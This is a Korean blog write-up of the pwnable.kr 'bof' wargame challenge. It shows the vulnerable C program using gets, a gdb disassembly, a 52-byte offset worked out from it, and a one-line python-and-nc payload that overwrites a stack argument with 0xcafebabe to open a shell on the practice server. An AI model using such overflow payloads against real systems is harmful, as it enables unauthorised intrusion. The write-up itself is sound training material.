---
title: '[Pwnable.kr] bof'
date: '2017-08-30'
---

![]({{ site.baseurl }}/assets/posts/pwnkr/bof.png)

이름만 봐도 알 수 있는 buffer overflow 문제!
코드는 다음과 같다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

gets함수 부분에 주석으로 smash me!가 있는걸 보니 gets 함수의 취약점을 이용한 bof인 듯 하다.
main에서 0xdeadbeef 값을 func에 넘겨주고 함수가 실행되는데 `key = 0xdeadbeef` 이고
user로 부터 변수 overflowme를 받은 후 `key가 0xcafebabe 과 일치할 때` 쉘을 실행시킨다.
그럼 어떻게 해야될까 gdb로 한 번 봐 보자

```
mitny@argos-edu:~/pwnable$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0000068a <+0>:	push   ebp
   0x0000068b <+1>:	mov    ebp,esp
   0x0000068d <+3>:	and    esp,0xfffffff0
   0x00000690 <+6>:	sub    esp,0x10
   0x00000693 <+9>:	mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:	call   0x62c < func>
   0x0000069f <+21>:	mov    eax,0x0
   0x000006a4 <+26>:	leave  
   0x000006a5 <+27>:	ret    
End of assembler dump.
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 < func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 < func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b < func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 < func+57>
   0x00000669 <+61>:	jmp    0x677 < func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 < func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 < func+92>
   0x00000683 <+87>:	call   0x684 < func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
```
`0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe `
이 부분에서 ebp+0x8 에 있는 값과 0xcafebabe 를 비교해서 
일치하지 않으면 func+63 으로 jump, 일치하면 func+75로 jump를 하게 되는데

[ebp-0x2c] 와 [ebp+0x8] 사이의 거리는 52!
즉, 52바이트 만큼 다른 문자를 채워넣고 0xcafebabe 를 넣어 주면 된다.

`(python -c 'print "A"*52+"\xbe\xba\xfe\xca"'; cat) |nc pwnable.kr 9000` 를 해주면
![]({{ site.baseurl }}/assets/posts/pwnkr/bof_flag.png)

flag가 뜬다!

`daddy, I just pwned a buFFer :)`
